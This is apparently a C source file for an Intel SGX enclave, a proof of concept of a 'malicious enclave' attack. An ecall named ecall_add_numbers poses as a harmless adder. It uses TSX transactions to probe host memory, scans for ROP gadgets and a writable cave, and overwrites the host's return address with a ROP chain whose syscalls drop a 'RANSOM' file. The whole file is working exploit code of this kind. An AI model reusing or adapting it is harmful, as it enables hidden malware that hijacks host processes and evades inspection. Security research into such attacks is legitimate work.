#include <stdarg.h>
#include <stdio.h>
#include <string.h>

#include "Enclave.h"
#include "Enclave_t.h"

typedef uint64_t sys_word_t;
typedef struct _thread_data_t
{
    sys_word_t  self_addr;
    sys_word_t  last_sp;            /* set by urts, relative to TCS */
    sys_word_t  stack_base_addr;    /* set by urts, relative to TCS */
    sys_word_t  stack_limit_addr;   /* set by urts, relative to TCS */
    sys_word_t  first_ssa_gpr;      /* set by urts, relative to TCS */
    sys_word_t  stack_guard;        /* GCC expects start_guard at 0x14 on x86 and 0x28 on x64 */

    sys_word_t  flags;
    sys_word_t  xsave_size;         /* in bytes (se_ptrace.c needs to know its offset).*/
    sys_word_t  last_error;         /* init to be 0. Used by trts. */

#ifdef TD_SUPPORT_MULTI_PLATFORM
    sys_word_t  m_next;             /* next TD used by trusted thread library (of type "struct _thread_data *") */
#else
    struct _thread_data_t *m_next;
#endif
    sys_word_t  tls_addr;           /* points to TLS pages */
    sys_word_t  tls_array;          /* points to TD.tls_addr relative to TCS */
#ifdef TD_SUPPORT_MULTI_PLATFORM
    sys_word_t  exception_flag;     /* mark how many exceptions are being handled */
#else
    intptr_t    exception_flag;
#endif
    sys_word_t  cxx_thread_info[6];
    sys_word_t  stack_commit_addr;
} thread_data_t;

#ifdef __cplusplus
extern "C" {
#endif

thread_data_t *get_thread_data(void);

#ifdef __cplusplus
}
#endif


/*
 * printf OCALL to show the debug messages, not required for the attack
 */
void printf(const char *fmt, ...)
{
    char buf[BUFSIZ] = {'\0'};
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, BUFSIZ, fmt, ap);
    va_end(ap);
    ocall_print_string(buf);
}


#define _XBEGIN_STARTED		(~0u)
#define _XABORT_EXPLICIT	(1 << 0)
#define _XABORT_RETRY		(1 << 1)
#define _XABORT_CONFLICT	(1 << 2)
#define _XABORT_CAPACITY	(1 << 3)
#define _XABORT_DEBUG		(1 << 4)
#define _XABORT_NESTED		(1 << 5)
#define _XABORT_CODE(x)		(((x) >> 24) & 0xFF)


__attribute__((always_inline)) inline unsigned int xbegin(void)
{
  unsigned status;
  asm volatile ("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) );
  return status;
}
__attribute__((always_inline)) inline void xend(void)
{
  asm volatile ("xend");
}

__attribute__((always_inline)) inline void xabort(void)
{
  asm volatile ("xabort $0");
}


size_t is_mapped(const void* addr) {
    size_t status;
    do {
        if ((status = xbegin()) == _XBEGIN_STARTED) {
            *(volatile size_t*)addr;
            xend();
            return 1;
        } else if(status == 0 || status == _XABORT_EXPLICIT) {
            return 0;
        }
    } while(1);
}

int is_writable(const void* addr) {
    size_t status;
    do {
        if ((status = xbegin()) == _XBEGIN_STARTED) {
            *(volatile size_t*)addr = 0x1234;
            xabort();
        } else if(status == 0) {
            return 0;
        } else if(status == _XABORT_EXPLICIT) {
            return 1;
        }
    } while(1);
}


typedef struct {
    int len;
    const char* pattern;
    size_t addr;
    const char* name;
} gadget_t;


typedef struct {
    gadget_t* list;
    int len;
} gadgets_t;


int find_gadgets(const void* start, size_t len, int dir, gadgets_t* gadgets) {
    char* starting = (char*)(((size_t)start + 4095) & ~0xfff);
    int remaining = gadgets->len;
    for(size_t i = 0; i < len; i += 4096) {
        if(is_mapped(starting + i * dir) && !is_writable(starting + i * dir)) {
            for(int g = 0; g < gadgets->len; g++) {
                if(!gadgets->list[g].addr) {
                    for(size_t j = 0; j < 4096 - gadgets->list[g].len; j++) {
                        if(!memcmp(starting + i * dir + j, gadgets->list[g].pattern, gadgets->list[g].len)) {
                            printf("Found gadget [%s] @ 0x%zx", gadgets->list[g].name, (size_t)(starting + i * dir + j));
                            gadgets->list[g].addr = (size_t)(starting + i * dir + j);
                            remaining--;
                            if(remaining == 0) return 1;
                            break;
                        }
                    }
                }
            }
        }
    }
    return 0;
}

char nullpage[4096];

size_t find_cave(const void* start, size_t len, int dir) {
    char* starting = (char*)(((size_t)start + 4095) & ~0xfff);
    for(size_t i = 0; i < len; i += 4096) {
        if(is_mapped(starting + i * dir) && is_writable(starting + i * dir)) {
            if(memcmp(starting + i * dir, nullpage, sizeof(nullpage)) == 0) {
                return (size_t)(starting + i * dir);
            }
        }
    }
    return 0;
}

size_t get_gadget(gadgets_t* gadgets, const char* pattern, int len) {
    int i;
    for(i = 0; i < gadgets->len; i++) {
        if(gadgets->list[i].len == len && memcmp(gadgets->list[i].pattern, pattern, len) == 0) {
            return gadgets->list[i].addr;
        }
    }
    return 0;
}

#define POP_RDI "\x5f\xc3"
#define POP_RSI "\x5e\xc3"
#define POP_RAX "\x58\xc3"
#define POP_RDX "\x5a\xc3"
#define SYSCALL "\x0f\x05\xc3"
#define LEAVE "\xc9\xc3"
#define XCHG_RAX_RDI "\x97\xc3"

#define REQUIRE(gadget) gadgets.list[gadgets.len++] = {.len = sizeof(gadget) - 1, .pattern = gadget, .addr = 0, .name = #gadget};

#define GADGET(gadget) new_stack[offset++] = get_gadget(&gadgets, gadget, sizeof(gadget) - 1)
#define VALUE(v)      new_stack[offset++] = (size_t)(v)

int ecall_add_numbers(int a, int b) {
    void* start = (void*)0x7ffffffff000ull;
    printf("Start @ %p", start);

    thread_data_t *thread_data = get_thread_data();

    size_t* regs = (size_t*)(thread_data->first_ssa_gpr);
    size_t* stack = (size_t*)regs[18];
    printf("Saved RSP: %zx", regs[18]);
    printf("Saved RBP: %zx", regs[19]);

    size_t ptr = (size_t)regs[19] + 296;

    printf("Searching for stack frame...");
    for(int i = 8; i < 8000; i += 16) {
        if(!is_mapped((void*)(regs[19] + i + 8))) break;
        size_t v1 = *(size_t*)(regs[19] + i);
        size_t v2 = *(size_t*)(regs[19] + i + 8);
        if(!is_mapped((void*)v1) || !is_mapped((void*)v2)) continue;
        if(v1 > 0x400000 /* looks like code */
            && v2 > 0x700000000000ull  /* looks like stack */
            && v2 > v1 + 4 * 1024 * 1024 /* code before stack */
            && v2 > regs[19] - 4 * 1024 * 1024 && v2 < regs[19] + 4 * 1024 * 1024 /* stack max approx 4mb */
            && *(size_t*)v2 > v2 /* rbp chain? */
        ) {
            printf("Stack frame @ %d: %zx / %zx (%zx / %zx)", i, v1, v2, *(size_t*)v1, *(size_t*)v2);
            ptr = (size_t)regs[19] + i;
//            break;
        }
    }
    
    int pos = 0;
    size_t* rip = (size_t*)ptr;
    size_t* rbp = (size_t*)(ptr - 8);
    printf("RIP @ %p", rip);
    printf("RBP @ %p", rbp);


    printf("Searching for gadgets...");
    gadgets_t gadgets;
    gadgets.len = 0;
    gadgets.list = (gadget_t*)malloc(100 * sizeof(gadget_t));
    
    REQUIRE(POP_RDI);
    REQUIRE(POP_RAX);
    REQUIRE(POP_RSI);
    REQUIRE(POP_RDX);
    REQUIRE(SYSCALL);
    REQUIRE(LEAVE);
    REQUIRE(XCHG_RAX_RDI);

    if(!find_gadgets(start, 2ull * 1024 * 1024 * 1024 * 1024, -1, &gadgets)) {
        printf("Did not find all required ROP gadgets!");
        return a + b;
    }

    printf("Searching for data cave...");
    char* cave = (char*)find_cave(start, 2ull * 1024 * 1024 * 1024 * 1024, -1);
    if(!cave) {
        printf("Could not find a data cave!");
        return a + b;
    }
    printf("Cave @ %p", cave);

    printf("Building ROP chain...");
    size_t* new_stack = (size_t*)(cave + 1024);
    const char* msg = "\n    \033[91mHello from the malicious enclave! There should now be a file 'RANSOM'.\033[39m\n\n";
    memcpy(cave, msg, strlen(msg) + 1);
    
    memcpy(cave + 128, "RANSOM", 7);
    
    const char* ransom_msg = "This could be a ransom message coming directly from the enclave\n";
    memcpy(cave + 192, ransom_msg, strlen(ransom_msg) + 1);

    size_t offset = 1;
    
    // write string
    GADGET(POP_RDX);
    VALUE(strlen(msg));
    GADGET(POP_RSI);
    VALUE(cave);
    GADGET(POP_RDI);
    VALUE(1);
    GADGET(POP_RAX);
    VALUE(1);
    GADGET(SYSCALL);
    
    // open file
    GADGET(POP_RDX);
    VALUE(0600);
    GADGET(POP_RSI);
    VALUE(65); // create + write
    GADGET(POP_RDI);
    VALUE(cave + 128);
    GADGET(POP_RAX);
    VALUE(2);
    GADGET(SYSCALL);
    GADGET(XCHG_RAX_RDI);
    
    // write message
    GADGET(POP_RAX);
    VALUE(1);
    GADGET(POP_RSI);
    VALUE(cave + 192);
    GADGET(POP_RDX);
    VALUE(strlen(ransom_msg));
    GADGET(SYSCALL);
    
    new_stack[offset++] = *rip;
    new_stack[0] = *rbp;

    *rip = get_gadget(&gadgets, LEAVE, 2); // leave + ret
    *rbp = (size_t)new_stack;

    free(gadgets.list);
    
    printf("Payload ready!");

    return a + b;
}
